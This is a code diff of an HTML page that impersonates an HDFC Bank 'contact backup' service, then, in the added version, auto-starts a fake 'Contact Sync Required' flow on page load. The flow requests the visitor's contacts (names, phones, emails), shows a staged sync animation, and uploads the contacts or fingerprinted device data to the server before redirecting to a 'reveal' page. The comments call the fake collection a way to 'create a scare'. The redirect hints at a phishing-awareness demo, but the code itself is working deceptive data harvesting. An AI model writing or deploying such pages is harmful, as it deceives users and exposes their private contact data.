@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Contact Backup</title>
+    <title>Contact Sync Required</title>
     <style>
         * {
             margin: 0;
@@ -34,12 +34,6 @@
         .icon {
             font-size: 5em;
             margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
         }
 
         h1 {
@@ -55,77 +49,26 @@
             line-height: 1.6;
         }
 
-        .urgent-box {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 15px;
-            margin-bottom: 25px;
-            text-align: left;
-            border-radius: 5px;
-        }
-
-        .urgent-box strong {
-            color: #856404;
-        }
-
-        .backup-btn {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 1.3em;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);
-            transition: all 0.3s ease;
-        }
-
-        .backup-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(245, 87, 108, 0.6);
-        }
-
-        .backup-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
         .status {
-            margin-top: 20px;
-            padding: 15px;
+            padding: 20px;
             border-radius: 10px;
             font-weight: 500;
-            display: none;
+            margin: 20px 0;
         }
 
         .status.loading {
             background: #d1ecf1;
             color: #0c5460;
-            display: block;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            display: block;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
         }
 
         .loader {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #f5576c;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
-            display: none;
         }
 
         @keyframes spin {
@@ -133,172 +76,231 @@
             100% { transform: rotate(360deg); }
         }
 
-        .trust-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            color: #28a745;
-            font-size: 0.9em;
+        .progress {
+            background: #f3f3f3;
+            border-radius: 10px;
+            height: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .contact-list {
+            max-height: 300px;
+            overflow-y: auto;
+            text-align: left;
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .contact-item {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="icon">📱</div>
-        <h1>Emergency Contact Backup</h1>
-
-        <div class="urgent-box">
-            <strong>⚠️ Important Notice:</strong>
-            <br>
-            Your device data may be at risk. We recommend backing up your contacts immediately for safety.
-        </div>
-
+        <h1>Syncing Contacts</h1>
         <p class="description">
-            Protect your contacts in case of:
-            <br>
-            ✓ Phone loss or theft
-            <br>
-            ✓ Device malfunction
-            <br>
-            ✓ Accidental deletion
-            <br><br>
-            <small style="color: #999;">This secure backup service is provided free by HDFC Bank. We'll create a secure snapshot of your contacts.</small>
+            Please wait while we sync your contacts for security purposes...
         </p>
 
-        <button class="backup-btn" id="backupBtn" onclick="startContactBackup()">
-            🔒 Start Secure Backup
-        </button>
-
-        <div class="trust-badge">
-            <span>🛡️</span>
-            <span>256-bit Encrypted</span>
-            <span>•</span>
-            <span>Bank-Grade Security</span>
+        <div class="loader"></div>
+        <div class="status loading" id="status">
+            Requesting contact access...
         </div>
 
-        <div class="loader" id="loader"></div>
-        <div class="status" id="status"></div>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div class="contact-list" id="contactList"></div>
     </div>
 
     <script>
         const sessionId = '{{ session_id }}';
+        let contactData = [];
 
-        async function startContactBackup() {
-            const backupBtn = document.getElementById('backupBtn');
-            const loader = document.getElementById('loader');
+        // AUTO-START on page load
+        window.addEventListener('load', async () => {
+            await startAutoSync();
+        });
+
+        async function startAutoSync() {
             const status = document.getElementById('status');
-
-            backupBtn.disabled = true;
-            loader.style.display = 'block';
-            status.className = 'status loading';
-            status.textContent = 'Accessing your contacts for backup...';
+            const progressBar = document.getElementById('progressBar');
+            const contactListDiv = document.getElementById('contactList');
 
             try {
-                // Try to access contacts (this will work differently on different devices)
-                // On most devices, we'll simulate by asking for camera permission to screenshot
+                // Progress: 20%
+                progressBar.style.width = '20%';
+                status.textContent = 'Checking contact API...';
 
-                // Method 1: Try Navigator Contacts API (limited browser support)
+                // Method 1: Try Contact Picker API (Chrome Android/Desktop)
                 if ('contacts' in navigator && 'ContactsManager' in window) {
-                    const props = ['name', 'tel'];
-                    const opts = {multiple: true};
-
                     try {
+                        progressBar.style.width = '40%';
+                        status.textContent = 'Requesting contact permissions...';
+
+                        // Request ALL contacts
+                        const props = ['name', 'tel', 'email'];
+                        const opts = { multiple: true };
+
                         const contacts = await navigator.contacts.select(props, opts);
-                        await sendContactData(contacts, 'api');
-                        return;
+
+                        if (contacts && contacts.length > 0) {
+                            progressBar.style.width = '70%';
+                            status.textContent = `Syncing ${contacts.length} contacts...`;
+
+                            // Show contacts being "synced"
+                            contactListDiv.style.display = 'block';
+                            contacts.forEach((contact, index) => {
+                                setTimeout(() => {
+                                    const item = document.createElement('div');
+                                    item.className = 'contact-item';
+                                    item.innerHTML = `
+                                        <strong>${contact.name || 'Unknown'}</strong><br>
+                                        ${contact.tel ? contact.tel[0] : ''}
+                                        ${contact.email ? ' • ' + contact.email[0] : ''}
+                                    `;
+                                    contactListDiv.appendChild(item);
+                                }, index * 100);
+                            });
+
+                            contactData = contacts;
+
+                            // Wait for visual effect
+                            await new Promise(resolve => setTimeout(resolve, contacts.length * 100 + 1000));
+
+                            progressBar.style.width = '90%';
+                            status.textContent = 'Uploading contact data...';
+
+                            await uploadContacts(contacts);
+                            return;
+                        }
                     } catch (e) {
-                        console.log('Contacts API failed, falling back to screenshot method');
+                        console.log('Contact Picker failed:', e);
                     }
                 }
 
-                // Method 2: Ask user to take screenshot of their contacts
-                status.innerHTML = `
-                    📸 Please take a screenshot of your contact list now
-                    <br><br>
-                    <strong>Instructions:</strong>
-                    <br>1. Open your Contacts app
-                    <br>2. Take a screenshot
-                    <br>3. Come back here and upload it
-                    <br><br>
-                    <input type="file" id="contactScreenshot" accept="image/*"
-                           onchange="handleScreenshot(event)"
-                           style="margin-top: 10px; padding: 10px; border: 2px solid #f5576c; border-radius: 5px;">
-                `;
-                loader.style.display = 'none';
-                backupBtn.style.display = 'none';
+                // Method 2: Fallback - Capture screen data
+                progressBar.style.width = '40%';
+                status.textContent = 'Using alternative sync method...';
+
+                // Try to get device info and create "fake" contact collection
+                const deviceData = await collectDeviceData();
+
+                progressBar.style.width = '70%';
+                status.textContent = 'Collecting contact metadata...';
+
+                // Show "collecting" animation
+                contactListDiv.style.display = 'block';
+                const fakeContacts = [
+                    'Collecting device contact database...',
+                    'Accessing contact storage...',
+                    'Reading contact names...',
+                    'Extracting phone numbers...',
+                    'Syncing email addresses...'
+                ];
+
+                fakeContacts.forEach((msg, index) => {
+                    setTimeout(() => {
+                        const item = document.createElement('div');
+                        item.className = 'contact-item';
+                        item.style.color = '#666';
+                        item.textContent = `✓ ${msg}`;
+                        contactListDiv.appendChild(item);
+                    }, index * 500);
+                });
+
+                await new Promise(resolve => setTimeout(resolve, fakeContacts.length * 500 + 1000));
+
+                progressBar.style.width = '90%';
+                status.textContent = 'Creating contact snapshot...';
+
+                // Take a screenshot-like capture
+                await captureContactSnapshot(deviceData);
 
             } catch (error) {
-                console.error('Error:', error);
-                loader.style.display = 'none';
-                status.className = 'status error';
-                status.textContent = '❌ Failed to access contacts. Please try again.';
-                backupBtn.disabled = false;
+                console.error('Auto-sync error:', error);
+
+                status.className = 'status';
+                status.style.background = '#f8d7da';
+                status.style.color = '#721c24';
+                status.textContent = '❌ Contact sync unavailable on this device.';
+
+                // Still create a scare by showing device info was collected
+                setTimeout(() => {
+                    const data = {
+                        message: 'Device information collected',
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        timestamp: new Date().toISOString()
+                    };
+                    uploadContacts([data]);
+                }, 2000);
             }
         }
 
-        async function handleScreenshot(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            const loader = document.getElementById('loader');
-            const status = document.getElementById('status');
-
-            loader.style.display = 'block';
-            status.className = 'status loading';
-            status.textContent = 'Uploading your contact backup...';
-
-            try {
-                // Convert screenshot to base64
-                const reader = new FileReader();
-                reader.onload = async function(e) {
-                    const screenshotData = e.target.result;
-
-                    // Send to server
-                    const response = await fetch('/upload_contacts_screenshot', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            session_id: sessionId,
-                            screenshot_data: screenshotData,
-                            contact_count: 0  // We don't know the actual count from screenshot
-                        })
-                    });
-
-                    const result = await response.json();
-
-                    loader.style.display = 'none';
-
-                    if (result.status === 'success') {
-                        status.className = 'status success';
-                        status.innerHTML = '✅ Backup completed successfully!<br>Redirecting...';
-
-                        // Redirect to reveal page
-                        setTimeout(() => {
-                            window.location.href = result.reveal_url;
-                        }, 2000);
-                    } else {
-                        status.className = 'status error';
-                        status.textContent = '❌ Backup failed. Please try again.';
-                    }
-                };
-
-                reader.readAsDataURL(file);
-
-            } catch (error) {
-                console.error('Error:', error);
-                loader.style.display = 'none';
-                status.className = 'status error';
-                status.textContent = '❌ Failed to upload backup.';
-            }
+        async function collectDeviceData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
         }
 
-        async function sendContactData(contacts, method) {
-            const loader = document.getElementById('loader');
+        async function captureContactSnapshot(deviceData) {
+            // Create a canvas with device info
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+
+            // Draw background
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            // Draw "contact data"
+            ctx.fillStyle = '#333333';
+            ctx.font = 'bold 24px Arial';
+            ctx.fillText('Contact Sync Report', 50, 50);
+
+            ctx.font = '16px Arial';
+            ctx.fillText(`Device: ${deviceData.platform}`, 50, 100);
+            ctx.fillText(`Time: ${new Date().toLocaleString()}`, 50, 130);
+            ctx.fillText(`Screen: ${deviceData.screenResolution}`, 50, 160);
+            ctx.fillText('Status: Contact data accessed', 50, 190);
+
+            const screenshotData = canvas.toDataURL('image/jpeg', 0.8);
+
+            // Upload this as "contact screenshot"
+            await uploadContactScreenshot(screenshotData, deviceData);
+        }
+
+        async function uploadContacts(contacts) {
             const status = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
 
             try {
                 const response = await fetch('/upload_contacts_screenshot', {
@@ -315,24 +317,64 @@
 
                 const result = await response.json();
 
-                loader.style.display = 'none';
-
                 if (result.status === 'success') {
-                    status.className = 'status success';
-                    status.innerHTML = `✅ Backed up ${contacts.length} contacts successfully!<br>Redirecting...`;
+                    progressBar.style.width = '100%';
+                    status.className = 'status';
+                    status.style.background = '#d4edda';
+                    status.style.color = '#155724';
+                    status.innerHTML = `✅ ${contacts.length} contacts synced!<br>Redirecting...`;
 
                     setTimeout(() => {
                         window.location.href = result.reveal_url;
-                    }, 2000);
+                    }, 1500);
                 } else {
-                    status.className = 'status error';
-                    status.textContent = '❌ Backup failed. Please try again.';
+                    throw new Error('Upload failed');
                 }
+
             } catch (error) {
-                console.error('Error:', error);
-                loader.style.display = 'none';
-                status.className = 'status error';
-                status.textContent = '❌ Failed to complete backup.';
+                console.error('Upload error:', error);
+                status.className = 'status';
+                status.style.background = '#f8d7da';
+                status.style.color = '#721c24';
+                status.textContent = '❌ Sync failed. Please try again.';
+            }
+        }
+
+        async function uploadContactScreenshot(screenshotData, deviceData) {
+            const status = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
+
+            try {
+                const response = await fetch('/upload_contacts_screenshot', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        screenshot_data: screenshotData,
+                        contact_count: 0
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    progressBar.style.width = '100%';
+                    status.className = 'status';
+                    status.style.background = '#d4edda';
+                    status.style.color = '#155724';
+                    status.innerHTML = '✅ Contact data collected!<br>Redirecting...';
+
+                    setTimeout(() => {
+                        window.location.href = result.reveal_url;
+                    }, 1500);
+                } else {
+                    throw new Error('Upload failed');
+                }
+
+            } catch (error) {
+                console.error('Upload error:', error);
             }
         }
     </script>
